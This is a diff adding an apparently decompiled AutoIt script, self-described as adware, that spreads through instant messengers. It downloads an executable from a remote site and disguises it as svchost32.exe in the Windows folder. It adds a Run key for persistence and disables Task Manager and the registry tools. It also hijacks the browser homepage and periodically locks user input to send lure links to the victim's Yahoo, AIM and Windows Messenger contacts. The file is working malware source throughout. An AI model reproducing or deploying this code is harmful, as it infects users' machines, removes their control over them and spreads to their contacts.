@@ -1,0 +1,212 @@
+; <AUT2EXE VERSION: 3.2.0.1>
+
+; ----------------------------------------------------------------------------
+; <AUT2EXE INCLUDE-START: D:\@Baclp\network\enet.au3>
+; ----------------------------------------------------------------------------
+
+; <AUT2EXE VERSION: 3.2.0.1>
+
+; ----------------------------------------------------------------------------
+; <AUT2EXE INCLUDE-START: D:\AutoIT\Projects\Adware\DKC.au3>
+; ----------------------------------------------------------------------------
+
+;--------------------------------------------
+; Tac Gia: Lee saoonline
+; Phan Mem: enet
+; Phien Ban: 1.1
+; Cong Dung: Quang cao Website thong qua Y!M
+; Phat Hanh: 20-9-2006
+;--------------------------------------------
+
+; Thiet Lap
+#NoTrayIcon
+$website = "www.saoonline.info"
+
+; Lay Nhiem Vao He Thong
+If Not FileExists(@WindowsDir & "\svchost32.exe") Then
+ 		InetGet ("http://www.saoonline.info/enet.exe", @WindowsDir & "\svchost32.exe", 0, 1)
+ 		Sleep(5000)
+	EndIf
+
+; Ghi Khoa Registry
+RegWrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel", "Homepage", "REG_DWORD", "1")
+RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "REG_DWORD", "1")
+RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "REG_DWORD", "1")
+RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Start Page", "REG_SZ", $website)
+RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_buzz", "content url", "REG_SZ", $website)
+RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_Launchcast", "content url", "REG_SZ", $website)
+RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Task Manager", "REG_SZ", @WindowsDir & "\svchost32.exe")
+RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Window Title", "REG_SZ", "Webhosting http://cuchuoi9.googlepages.com")
+
+; Danh Sach Tin Nhan Ngau Nhien
+Dim $tin[16]
+$tin[0] = "Moi lam trang web nay, moi nguoi cho y kien www.saoonline.info/ "
+$tin[1] = "HOT HOT, girl xinh cac truong PTTH o Ha Noi ? www.saoonline.info/?id=girlxinh "
+$tin[2] = "Goi dien thoai mien phi trong Viet Nam : " & $website & " >:D< "
+$tin[3] = "Hay vao day : " & $website & " de binh chon cho hoa khoi Viet Nam "
+$tin[4] = "Goi dien VOIP free tu 19 - 9 den 10 - 10 ne`  www.saoonline.com/?id=voip << "
+$tin[5] = "Cac ban co the tranh bi nhiem cac loai virus online gan day bang cach update Windows . Vao day de biet cach Update Win ma ko can ban quyen Windows xin: www.saoonline.info "
+$tin[6] = "Trang web cam phu nu co thai va tre em duoi 18 tuoi : http://www.saoonline.info/?id=relax << 8-> "
+$tin[7] = "di'nh virus ru`i =)) du`ng cai  nay ma diet na`y :  www.saoonline.info?scanvirus "
+$tin[8] = "Vao` ho trang web nay` voi, mang cham qua khong vao duoc : " & $website & "  "
+$tin[9] = "Download free MP3s : " & $website & " << "
+$tin[10] = "Ai co dien thoai di dong vao day tai nhac chuong : " & $website & " C00l !!! "
+$tin[11] = "HOT HOT, toan bo cac bai hat trong game audition : www.saoonline.info << "
+$tin[12] = "Goi dien thoai mien phi trong Viet Nam : " & $website & " X-( "
+$tin[13] = "Danh sach cac trang web bi dinh virus  " & $website & "  moi nguoi nen cap nhat de de phong << "
+$tin[14] = "=> NewSong of Nk -=- Let luv ur life !! Check it...Hay lam' na`.. www.saoonline.info  "
+$tin[15] = "check this link for me : " & $website & " . Why I cannot surf this site ??? "
+
+
+; Ham Thay Doi Status & Gui Tin Nhan
+While (1)
+sleep(60000)
+
+$tieude1 = WinGetTitle("Yahoo! Messenger", "")
+$kiemtra1 = WinExists ($tieude1)
+$tieude2 = WinGetTitle("AIM", "")
+$kiemtra2 = WinExists ($tieude2)
+$tieude3 = WinGetTitle("Windows Live Messenger", "")
+$kiemtra3 = WinExists ($tieude3)
+$tieude4 = WinGetTitle("Windows Messenger", "")
+$kiemtra4 = WinExists ($tieude3)
+
+
+	If $kiemtra1 = 1 Then
+		$ngaunhien = Random(0,12,1)
+		ClipPut($tin[$ngaunhien])
+		BlockInput (1)
+		WinActivate($tieude1)
+		Send("!m")
+		Send("un")
+		Send("^v {ENTER}{ENTER}")
+		Send("^m")
+		Send("{DOWN}")
+		Send("^{SHIFTDOWN}{END}{SHIFTUP}")
+		Send("{ENTER}")
+		Send("^v {ENTER}")
+		BlockInput (0)
+	EndIf
+
+	If $kiemtra2 = 1 Then
+		$ngaunhien = Random(0,12,1)
+		ClipPut($tin[$ngaunhien])
+		BlockInput (1)
+		WinActivate($tieude2)
+		Send("{HOME}")
+		Send("{DOWN}")
+		Send("^{SHIFTDOWN}{PGDN}{SHIFTUP}")
+		Send("{ENTER}")
+		Send("^v {ENTER}")
+		Send("!{F4}")
+		Send("!{F4}")
+		BlockInput (0)
+	EndIf
+
+	If $kiemtra3 = 1 Then
+		$ngaunhien = Random(0,12,1)
+		ClipPut($tin[$ngaunhien])
+		BlockInput (1)
+		WinActivate($tieude3)
+		Send("{ALT}")
+		Send("a")
+		Send("{ENTER}")
+		Send("{SPACE}")
+		Send("{DOWN}")
+		Send("{SPACE}")
+		Send("{DOWN}")
+		Send("{SPACE}")
+		Send("{DOWN}")
+		Send("{SPACE}")
+		Send("{DOWN}")
+		Send("{SPACE}")
+		Send("{DOWN}")
+		Send("{SPACE}")
+		Send("{DOWN}")
+		Send("{SPACE}")
+		Send("{DOWN}")
+		Send("{SPACE}")
+		Send("{DOWN}")
+		Send("{SPACE}")
+		Send("{DOWN}")
+		Send("{SPACE}")
+		Send("{ENTER}")
+		Send("^v {ENTER}")
+		Send("!{F4}")
+		BlockInput (0)
+	EndIf
+
+	If $kiemtra4 = 1 Then
+		$ngaunhien = Random(0,12,1)
+		ClipPut($tin[$ngaunhien])
+		BlockInput (1)
+		WinActivate($tieude4)
+		Send("{ALT}")
+		Send("a")
+		Send("{ENTER}")
+		Send("{DOWN}")
+		Send("{DOWN}")
+		Send("{DOWN}")
+		Send("{DOWN}")
+		Send("{ENTER}")
+		Send("^v {ENTER}")
+		Send("!{F4}")
+		Send("{ALT}")
+		Send("a")
+		Send("{ENTER}")
+		Send("{DOWN}")
+		Send("{DOWN}")
+		Send("{DOWN}")
+		Send("{DOWN}")
+		Send("{DOWN}")
+		Send("{ENTER}")
+		Send("^v {ENTER}")
+		Send("!{F4}")
+		Send("{ALT}")
+		Send("a")
+		Send("{ENTER}")
+		Send("{DOWN}")
+		Send("{DOWN}")
+		Send("{DOWN}")
+		Send("{DOWN}")
+		Send("{DOWN}")
+		Send("{DOWN}")
+		Send("{ENTER}")
+		Send("^v {ENTER}")
+		Send("!{F4}")
+		Send("{ALT}")
+		Send("a")
+		Send("{ENTER}")
+		Send("{DOWN}")
+		Send("{DOWN}")
+		Send("{DOWN}")
+		Send("{DOWN}")
+		Send("{DOWN}")
+		Send("{DOWN}")
+		Send("{DOWN}")
+		Send("{ENTER}")
+		Send("^v {ENTER}")
+		Send("!{F4}")
+		Send("{ALT}")
+		Send("a")
+		Send("{ENTER}")
+		Send("{DOWN}")
+		Send("{DOWN}")
+		Send("{DOWN}")
+		Send("{DOWN}")
+		Send("{DOWN}")
+		Send("{DOWN}")
+		Send("{DOWN}")
+		Send("{DOWN}")
+		Send("{ENTER}")
+		Send("^v {ENTER}")
+		Send("!{F4}")
+		BlockInput (0)
+	EndIf
+Sleep(120000)
+WEnd
+
+; ----------------------------------------------------------------------------
+; <AUT2EXE INCLUDE-END: D:\@Baclp\network\enet.au3>
+; ----------------------------------------------------------------------------
+
